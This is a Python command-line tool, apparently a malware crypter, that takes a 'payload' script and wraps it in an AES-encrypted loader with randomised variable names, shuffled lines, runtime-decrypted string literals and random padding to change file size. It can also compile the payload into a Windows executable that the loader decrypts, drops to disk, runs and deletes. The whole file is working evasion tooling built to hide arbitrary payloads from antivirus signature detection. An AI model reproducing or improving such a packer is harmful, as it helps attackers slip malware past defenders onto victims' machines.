import typer
import numpy as np
import base64
import subprocess
import os
import shutil
import time
import tokenize
import io

from Crypto.Cipher import AES
from typing_extensions import Annotated

from console import ERROR_CONSOLE, SUCCESS_CONSOLE, CONSOLE
from utils import get_file, generate_key, generate_random_variable, get_file_bytes

app = typer.Typer()


@app.command()
def main(
    payload_path: str,
    save_path: str,
    compile_payload: Annotated[
        bool, typer.Option("--compile", help="Compile the payload into an executable")
    ] = False,
    encrypt_strings: Annotated[
        bool,
        typer.Option(
            "--encrypt-strings", help="Encrypts all the strings in the payload"
        ),
    ] = False,
    add_randomness: Annotated[
        bool,
        typer.Option(
            "--random-size", help="Adds random noise to the payload in order to randomize file size"
        ),
    ] = False,
):
    if encrypt_strings:
        payload_path = randomize_payload_strings(payload_path)

    if add_randomness:
        payload_path = add_random_noise(payload_path)

    if compile_payload:
        compile_and_encrypt_payload(payload_path, save_path)
    else:
        encrypt_payload(payload_path, save_path)

    if encrypt_strings:
        os.remove(payload_path)


def add_random_noise(payload_path):
    CONSOLE.print("Adding random noise to payload...")
    payload = get_file(payload_path)

    new_payload_path = os.path.split(payload_path)
    new_payload_path = new_payload_path[0] + "/randomized_" + new_payload_path[-1]

    with open(new_payload_path, "w") as f:
        f.write(payload)
        f.write("\n")
        var_name = generate_random_variable(30)
        f.write(f'{var_name} = """{generate_random_variable(np.random.randint(5e4,1e7))}"""')

    CONSOLE.print("Successfully added random noise!")

    return new_payload_path


def randomize_payload_strings(payload_path) -> str:
    """Reads the input file, processes the content, and writes the result to the output file."""
    CONSOLE.print("Encrypting payload strings...")
    with open(payload_path, "r", encoding="utf-8") as f:
        source_code = f.read()

    encoded_code, key = replace_strings_with_base64(source_code)

    encoded_code = (
        f'import base64\nfrom Crypto.Cipher import AES\nstring_cipher = AES.new(base64.b64decode("""{base64.b64encode(key).decode()}"""), AES.MODE_ECB)\n'
        + encoded_code
    )

    new_payload_path = os.path.split(payload_path)
    new_payload_path = new_payload_path[0] + "/string_encrypted_" + new_payload_path[-1]
    with open(new_payload_path, "w", encoding="utf-8") as f:
        f.write(encoded_code)

    CONSOLE.print("Successfully encrypted payload strings!")

    return new_payload_path


def encrypt_string(s, cipher):
    """Encodes a string using Base64."""
    padded_payload = s + ("\n" * ((16 - len(s)) % 16))
    encrypted_payload = cipher.encrypt(padded_payload.encode())
    return f'base64.b64decode("""{base64.b64encode(encrypted_payload).decode()}""")'


def replace_strings_with_base64(source_code):
    """Replaces all string literals in the source code with their Base64-encoded versions."""
    result = []
    tokens = tokenize.generate_tokens(io.StringIO(source_code).readline)
    key = generate_key()
    cipher = AES.new(key, AES.MODE_ECB)

    for token in tokens:
        token_type = token.type
        token_string = token.string
        start = token.start
        end = token.end
        line = token.line

        if token_type == tokenize.STRING:
            # Remove the quotes around the string and encode the content
            encoded_string = encrypt_string(token_string, cipher)
            # Rebuild the encoded string, wrapping it in quotes
            result.append(
                (
                    tokenize.STRING,
                    f"eval(string_cipher.decrypt({encoded_string}).decode().strip())",
                    start,
                    end,
                    line,
                )
            )
        else:
            # Keep all non-string tokens as they are
            result.append((token_type, token_string, start, end, line))

    # Join all tokens together to form the new source code
    return tokenize.untokenize(result), key


def encrypt_payload(payload_path: str, save_path: str) -> bool | None:
    """
    Generates a random key, creates random variable names for the decryption header
    program and encrypts the payload with AES in CBC mode
    """
    CONSOLE.print("Starting encryption...")
    payload = get_file(payload_path)

    if payload is None:
        return

    np.random.seed(int(time.time()))

    key = generate_key()
    variables = [generate_random_variable(np.random.randint(5, 16)) for i in range(7)]

    cipher = AES.new(key, AES.MODE_CBC)
    padded_payload = payload + ("\n" * ((16 - len(payload)) % 16))
    encrypted_payload = cipher.encrypt(padded_payload.encode())

    try:
        with open(save_path, "w") as f:
            header_lines = [f"from base64 import b64decode as {variables[5]}"]
            lines = [
                f"from Crypto.Cipher import AES as {variables[6]}",
                f'{variables[0]} = {variables[5]}("""{base64.b64encode(key).decode()}""")',
                f'{variables[1]} = {variables[5]}("""{base64.b64encode(encrypted_payload).decode()}""")',
                f'{variables[2]} = {variables[5]}("""{base64.b64encode(cipher.iv).decode()}""")',
            ]
            footer_lines = [
                f"{variables[3]} = {variables[6]}.new({variables[0]}, {variables[6]}.MODE_CBC, {variables[2]})",
                f"{variables[4]} = {variables[3]}.decrypt({variables[1]}).decode()",
                f"exec({variables[4]})",
            ]
            np.random.shuffle(lines)

            f.write("\n".join(header_lines + lines + footer_lines))
    except FileNotFoundError:
        ERROR_CONSOLE.print("Could not write encrypted payload to disk!")
        return None

    SUCCESS_CONSOLE.print(f"Successfully encrypted {payload_path} to {save_path}!")

    return True


def compile_and_encrypt_payload(payload_path: str, save_path: str):
    """
    Compiles the payload into a windows executeable
    """
    if compile_payload(payload_path) is None:
        return

    CONSOLE.print("Starting encryption...")
    payload = get_file_bytes(os.path.split(payload_path)[-1][:-3] + ".exe")
    os.remove(os.path.split(payload_path)[-1][:-3] + ".exe")

    if payload is None:
        return

    np.random.seed(int(time.time()))

    key = generate_key()
    variables = [generate_random_variable(np.random.randint(5, 16)) for i in range(11)]

    cipher = AES.new(key, AES.MODE_CBC)
    padded_payload = payload + (b"0" * ((16 - len(payload)) % 16))
    encrypted_payload = cipher.encrypt(padded_payload)

    try:
        with open(save_path, "w") as f:
            header_lines = [f"from base64 import b64decode as {variables[10]}"]
            lines = [
                f"from Crypto.Cipher import AES as {variables[7]}",
                f"import subprocess as {variables[8]}",
                f"import os as {variables[9]}",
                f'{variables[0]} = {variables[10]}("""{base64.b64encode(key).decode()}""")',
                f'{variables[1]} = {variables[10]}("""{base64.b64encode(encrypted_payload).decode()}""")',
                f'{variables[2]} = {variables[10]}("""{base64.b64encode(cipher.iv).decode()}""")',
            ]
            footer_lines = [
                f"{variables[3]} = {variables[7]}.new({variables[0]}, {variables[7]}.MODE_CBC, {variables[2]})",
                f"{variables[4]} = {variables[3]}.decrypt({variables[1]})",
                f"{variables[5]} = open('{variables[6]}.exe', 'wb')",
                f"{variables[5]}.write({variables[4]})",
                f"{variables[5]}.close()",
                f"{variables[8]}.run([r'{variables[6]}.exe'], shell=True)",
                f"input()",
                f"{variables[9]}.remove(r'{variables[6]}.exe')",
            ]
            np.random.shuffle(lines)

            f.write("\n".join(header_lines + lines + footer_lines))
    except FileNotFoundError:
        ERROR_CONSOLE.print("Could not write encrypted payload to disk!")
        return None

    SUCCESS_CONSOLE.print(f"Successfully encrypted!")

    if compile_payload(save_path) is None:
        return

    SUCCESS_CONSOLE.print(
        f'Successfully compiled payload to "{os.path.split(save_path)[-1][:-3]}.exe"!'
    )

    os.remove(save_path)


def compile_payload(payload_path: str):
    CONSOLE.print("Starting compilation...")
    process = subprocess.run(
        [
            "python3",
            "-m",
            "nuitka",
            payload_path,
            "--standalone",
            "--onefile",
            "--enable-plugin=tk-inter",
        ],
        capture_output=True,
        text=True,
    )

    if "No module named nuitka" in process.stderr:
        process = subprocess.run(
            [
                "python",
                "-m",
                "nuitka",
                payload_path,
                "--standalone",
                "--onefile",
                "--enable-plugin=tk-inter",
            ],
            capture_output=True,
            text=True,
        )
        if "No module named nuitka" in process.stderr:
            ERROR_CONSOLE.print("Error occred while compiling: ")
            ERROR_CONSOLE.print(process.stderr)
            return None

    CONSOLE.print("Removing build folders...")
    shutil.rmtree(os.path.split(payload_path)[-1][:-3] + ".build")
    shutil.rmtree(os.path.split(payload_path)[-1][:-3] + ".onefile-build")
    shutil.rmtree(os.path.split(payload_path)[-1][:-3] + ".dist")
    CONSOLE.print("Successfully compiled!")

    return True


if __name__ == "__main__":
    app()
